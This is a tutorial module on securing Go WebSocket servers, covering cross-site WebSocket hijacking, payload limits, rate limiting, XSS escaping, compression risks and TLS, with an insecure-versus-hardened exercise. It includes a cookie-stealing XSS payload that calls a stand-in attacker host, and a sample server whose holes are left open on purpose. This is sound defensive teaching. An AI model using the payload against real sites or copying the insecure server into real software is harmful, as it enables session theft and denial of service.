# Module 16: Security Best Practices

Securing stateful real-time applications requires a different approach than securing stateless HTTP endpoints. Because WebSockets bypass standard browser Same-Origin Policies (SOP) and maintain long-lived connections, they are vulnerable to unique attacks: Cross-Site WebSocket Hijacking (CSWSH), memory-exhaustion Denial of Service (DoS) from oversized payloads, rate limiting bypasses, and compression side-channel attacks.

This module details how to harden your Go WebSocket gateway. We will explore the mechanics of CSWSH, enforce payload size limits using `SetReadLimit`, implement token-bucket rate limiters, sanitize client inputs, evaluate compression vulnerabilities, configure secure TLS settings to support WSS, and complete a hands-on exercise to harden an insecure server.

---

## Learning Objectives
By the end of this module, you will be able to:
1. **Explain and mitigate CSWSH attacks** using origin validation.
2. **Protect your server from OOM crashes** by enforcing read limits.
3. **Implement token-bucket rate limiting** to prevent connection resource exhaustion.
4. **Sanitize client message inputs** to prevent Cross-Site Scripting (XSS) injection.
5. **Configure secure TLS settings** to support encrypted WSS connections.
6. **Harden an insecure WebSocket server** using Go security APIs.

---

## 1. Origin Attacks & Cross-Site WebSocket Hijacking (CSWSH)

Unlike standard HTTP requests, **WebSocket handshakes are not protected by browser Same-Origin Policies (SOP)**:
- A browser client on `malicioussite.com` can open a WebSocket connection to `wss://yourbank.com/ws` natively.
- During the handshake, the browser automatically includes any cookies associated with `yourbank.com`.
- If the server upgrades the connection without verifying the source, the malicious script can execute actions on behalf of the user.

### Mitigating CSWSH with CheckOrigin
To prevent CSWSH, you must configure the upgrader's `CheckOrigin` callback to validate the `Origin` header against an authorized domain whitelist:

```go
var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		origin := r.Header.Get("Origin")
		// Reject empty origins if browser-only clients are expected
		if origin == "" {
			return false
		}
		parsedURL, err := url.Parse(origin)
		if err != nil {
			return false
		}
		// Whitelist authorized domains
		return parsedURL.Hostname() == "app.example.com"
	},
}
```

---

## 2. DoS Attacks & Oversized Payloads

A simple Denial of Service (DoS) attack vector is sending an oversized payload:
- A malicious client initiates a WebSocket connection.
- It transmits a single frame with a declared payload size of 2 GB.
- If the server attempts to read and buffer this frame using `ReadMessage()`, it allocates 2 GB of memory on the heap, leading to memory exhaustion and Out-Of-Memory (OOM) crashes.

### Protecting Sockets with Read Limits
To prevent this, enforce a maximum payload limit using `conn.SetReadLimit(maxSize)`:

```go
// Enforce a maximum message size of 1 MB
conn.SetReadLimit(1024 * 1024)
```

- If a client transmits a frame exceeding this limit, the Gorilla reader immediately rejects the message, returns an error, sends close code **`1009 (Message Too Big)`**, and terminates the socket.

---

## 3. Rate Limiting & Input Sanitization

### 1. Token-Bucket Rate Limiting
Even if payload sizes are limited, a client can flood the server with high-frequency messages (e.g. sending 10,000 10-byte messages per second), exhausting server CPU and DB connection pools.

Enforce rate limits on connection read loops using a token-bucket rate limiter:

```go
import "golang.org/x/time/rate"

// Limit client to 10 messages per second, burst of 20
limiter := rate.NewLimiter(10, 20)

if !limiter.Allow() {
    // Throttled: Send close frame and exit loop
}
```

---

### 2. Input Sanitization
A common mistake in chat applications is taking client string payloads and broadcasting them directly to other users without validation:
```go
// Vulnerable Code: Pushing raw input to other users
conn.WriteMessage(websocket.TextMessage, rawClientPayload)
```
- If a client sends a payload containing malicious JavaScript:
  `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`
- When other clients receive and render this message, their browsers execute the script, leading to **Cross-Site Scripting (XSS)** vulnerabilities.
- **Mitigation**: Sanitize all client text inputs using Go's `html.EscapeString` before broadcasting them:

```go
import "html"

sanitizedPayload := html.EscapeString(string(rawClientPayload))
```

---

## 4. Compression Exploits & TLS (WSS)

### 1. Compression Exploits (CRIME/BREACH)
Enabling payload compression (`permessage-deflate`) reduces bandwidth consumption but introduces security and memory risks:
- **Compression side-channel attacks** (such as CRIME or BREACH) analyze variations in compressed frame sizes to decrypt sensitive data.
- **Memory Overhead**: Each compressed connection requires allocating slide window buffers for the compression state, which can lead to Out-Of-Memory crashes under high concurrency.
- **Recommendation**: Disable compression if your application transmits sensitive, high-frequency payloads, or restrict compression window sizes.

---

### 2. Enforcing WSS (WebSocket Secure)
Always run WebSockets over encrypted connections (**WSS**) in production. This prevents intermediate routers from proxying or tampering with frame payloads.

Configure secure TLS settings to enforce modern protocols:

```go
package main

import (
	"crypto/tls"
	"net/http"
)

func startSecureServer() {
	tlsConfig := &tls.Config{
		MinVersion:               tls.VersionTLS12, // Disable outdated TLS versions
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	}

	server := &http.Server{
		Addr:      ":8443",
		TLSConfig: tlsConfig,
	}

	// Start HTTPS / WSS listener
	server.ListenAndServeTLS("cert.pem", "key.pem")
}
```

---

## 5. Exercises: Hardening an Insecure Server

In this exercise, you will harden an insecure WebSocket server that is vulnerable to CSWSH, DoS memory exhaustion, rate limiting bypasses, and XSS injections.

### The Insecure Server:

```go
package main

import (
	"log"
	"net/http"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	// VULNERABILITY: Permitting all origins (CSWSH risk)
	CheckOrigin: func(r *http.Request) bool { return true },
}

func handleInsecure(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	for {
		// VULNERABILITY: No read limits configured (DoS risk)
		_, payload, err := conn.ReadMessage()
		if err != nil {
			break
		}

		// VULNERABILITY: Broadcasting raw payload without sanitization (XSS risk)
		conn.WriteMessage(websocket.TextMessage, payload)
	}
}

func main() {
	http.HandleFunc("/ws", handleInsecure)
	http.ListenAndServe(":8080", nil)
}
```

---

### The Hardened Server:

Below is the hardened server implementing origin validation, payload limits, token-bucket rate limiting, input sanitization, and secure TLS configurations:

```go
package main

import (
	"context"
	"crypto/tls"
	"html"
	"log"
	"net/http"
	"net/url"
	"time"
	"github.com/gorilla/websocket"
	"golang.org/x/time/rate"
)

var secureUpgrader = websocket.Upgrader{
	HandshakeTimeout: 5 * time.Second, // Prevent connection starvation
	ReadBufferSize:   1024,
	WriteBufferSize:  1024,
	CheckOrigin: func(r *http.Request) bool {
		origin := r.Header.Get("Origin")
		if origin == "" {
			return false // Reject browser-less clients if not authorized
		}
		parsedURL, err := url.Parse(origin)
		if err != nil {
			return false
		}
		// 1. Enforce origin whitelist validation
		return parsedURL.Hostname() == "localhost" || parsedURL.Hostname() == "app.example.com"
	},
}

func handleSecure(w http.ResponseWriter, r *http.Request) {
	conn, err := secureUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("[Handshake Refused]:", err)
		return
	}
	defer conn.Close()

	// 2. Enforce payload size limit (Capped at 256 KB)
	conn.SetReadLimit(256 * 1024)

	// 3. Configure token-bucket rate limiter (5 msg/sec, burst of 10)
	limiter := rate.NewLimiter(rate.Limit(5), 10)

	for {
		_, payload, err := conn.ReadMessage()
		if err != nil {
			break
		}

		// 4. Rate Limiting Check
		if !limiter.Allow() {
			log.Println("[Throttled] Client exceeded rate limit. Closing connection.")
			// Send policy violation close frame (code 1008)
			conn.WriteControl(
				websocket.CloseMessage,
				websocket.FormatCloseMessage(1008, "Policy Violation: Rate limit exceeded"),
				time.Now().Add(1*time.Second),
			)
			break
		}

		// 5. Input Sanitization: Prevent XSS injection attacks
		sanitizedContent := html.EscapeString(string(payload))
		
		log.Printf("[Secure Gateway] Broadcasting sanitized message: %s\n", sanitizedContent)

		// Echo sanitized content
		err = conn.WriteMessage(websocket.TextMessage, []byte(sanitizedContent))
		if err != nil {
			break
		}
	}
}

func main() {
	http.HandleFunc("/ws", handleSecure)

	// 6. Secure TLS Configuration (WSS)
	tlsConfig := &tls.Config{
		MinVersion:               tls.VersionTLS12,
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
	}

	server := &http.Server{
		Addr:      ":8443",
		TLSConfig: tlsConfig,
	}

	log.Println("[Secure server] Running secure gateway on :8443 (WSS)...")
	// Start WSS listener using certificate files
	if err := server.ListenAndServeTLS("cert.pem", "key.pem"); err != nil {
		log.Fatal(err)
	}
}
```

---

### Line-by-Line Code Walkthrough (Hardened Server):

- **Line 21**: `HandshakeTimeout: 5 * time.Second`
  Enforces a 5-second handshake timeout to mitigate slow-loris connection starvation attacks.
- **Line 26-29**: `CheckOrigin: func(...)`
  Enforces origin validation against a whitelist, preventing unauthorized cross-origin connections.
- **Line 46**: `conn.SetReadLimit(256 * 1024)`
  Configures a maximum payload size limit of 256 KB. If a client transmits a frame exceeding this limit, the upgrader immediately closes the connection.
- **Line 49**: `limiter := rate.NewLimiter(rate.Limit(5), 10)`
  Configures a token-bucket rate limiter: limits the client to an average of 5 messages per second, with a burst capacity of 10 tokens.
- **Line 57**: `if !limiter.Allow() { ... }`
  Checks if the client has exceeded their message rate limit.
- **Line 60-64**: `conn.WriteControl(...)`
  Sends a Close control frame with code `1008 (Policy Violation)` to notify the client of the rate limit violation before closing the socket.
- **Line 69**: `sanitizedContent := html.EscapeString(string(payload))`
  Sanitizes the incoming payload to prevent Cross-Site Scripting (XSS) injection attacks.
- **Line 82-89**: `tlsConfig := &tls.Config{ ... }`
  Configures secure TLS settings to support encrypted WSS connections, enforcing modern protocols and strong cipher suites.

---

## 6. Technical Interview Questions

### Question 1: Cross-Site WebSocket Hijacking (CSWSH)
*What is Cross-Site WebSocket Hijacking, and how does checking origin headers mitigate it?*

**Answer**:
CSWSH is a security vulnerability where a malicious site establishes a WebSocket connection to a server on behalf of a logged-in user, utilizing the user's session cookies which the browser appends automatically. 

Checking the `Origin` header allows the server to verify the connection request originates from an authorized domain and reject unauthorized cross-origin connections.

---

### Question 2: Default CheckOrigin Behavior
*What is the default behavior of Gorilla's `Upgrader` if no `CheckOrigin` function is defined?*

**Answer**:
If `CheckOrigin` is nil, the upgrader compares the host domain in the client's `Origin` header to the domain in the target server's `Host` header. 

If they do not match, the upgrader rejects the connection with `HTTP 403 Forbidden`.

---

### Question 3: Handshake Timeout
*Why should you configure a non-zero `HandshakeTimeout` in production?*

**Answer**:
Configuring a handshake timeout prevents slow-loris connection starvation attacks, where slow clients open sockets and delay sending handshake headers to exhaust server file descriptors.

---

### Question 4: sync.Pool GC Buffer recycling
*How does setting `WriteBufferPool` optimize memory allocations on busy WebSocket servers?*

**Answer**:
It recycles write buffers using Go's `sync.Pool` instead of allocating buffers on the heap for each connection. 

This reduces heap allocations to near-zero, lowering Garbage Collection pressure and preventing latency spikes.

---

### Question 5: Subprotocol Negotiation
*How does subprotocol negotiation work when the client requests protocols the server does not support?*

**Answer**:
If there is no match between client requested protocols and server supported protocols, the server ignores the subprotocol request and does not return the `Sec-WebSocket-Protocol` header. 

The connection upgrades successfully, but operates without a negotiated subprotocol.

---

### Question 6: Permessage-Deflate Memory Footprint
*What is the primary risk of enabling `EnableCompression` under high concurrency?*

**Answer**:
Each compressed connection requires allocating slide window buffers for the compression state, which can increase memory usage per connection by up to 300 KB. 

Under high concurrency, this can exhaust server RAM and lead to Out-Of-Memory crashes.

---

### Question 7: HTTP 405 Method Not Allowed
*What HTTP status code is returned if a client attempts to upgrade using a POST request instead of GET?*

**Answer**:
The upgrader rejects the request and returns `HTTP 405 Method Not Allowed`.

---

### Question 8: WriteBufferPool interface
*What interface must a custom buffer pool implement to be assigned to `WriteBufferPool`?*

**Answer**:
It must implement the `websocket.BufferPool` interface:
```go
type BufferPool interface {
    Get() interface{}
    Put(interface{})
}
```

---

### Question 9: Hijack error handling
*What happens if the upgrader's attempt to hijack the connection returns an error?*

**Answer**:
The upgrader returns the error to the caller, triggers the error callback function (writing a `500 Internal Server Error` response), and aborts the connection.

---

### Question 10: Cookie session validation
*Why is checking origin headers critical if your application uses cookies for authentication?*

**Answer**:
Browsers automatically include cookies with cross-origin requests, exposing the application to Cross-Site WebSocket Hijacking if origin verification is disabled.

---

## Summary
- **Origin Validation** (`CheckOrigin`) protects your application from Cross-Site WebSocket Hijacking (CSWSH) attacks.
- **Enforce read limits** (`SetReadLimit`) to protect your server from memory-exhaustion Denial of Service (DoS) attacks.
- **Implement rate limiting** (`golang.org/x/time/rate`) to prevent resource exhaustion from client message floods.
- **Sanitize client inputs** (`html.EscapeString`) to prevent Cross-Site Scripting (XSS) injection.
- **Configure secure TLS settings** to enforce modern protocols (TLS 1.2/1.3) and strong cipher suites.
- Always run WebSockets over encrypted connections (**WSS**) in production.
